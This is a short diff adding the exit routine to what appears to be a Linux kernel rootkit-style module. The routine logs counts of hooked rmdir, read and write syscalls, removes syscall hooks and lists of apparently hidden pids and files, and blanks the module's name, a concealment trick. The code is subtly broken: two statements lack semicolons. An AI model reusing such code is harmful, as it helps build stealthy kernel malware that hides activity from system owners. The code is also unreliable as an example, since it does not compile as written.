@@ -945,3 +945,21 @@ int init(void)
     return 0;
 
 }
+
+void exit(void)
+{
+
+    pr_info("sys_rmdir was called %lu times\n", asm_rmdir_count);
+    pr_info("sys_read was called %lu times\n", read_count)
+    pr_info("sys_write was called %lu times\n", write_count);
+
+    //cleanup
+    hook_remove_all();
+    asm_hook_remove();
+    pid_remove_all();
+    file_remove_all();
+
+    THIS_MODULE->name[0] = 0;
+    
+    pr_info("Module removed\n")
+}
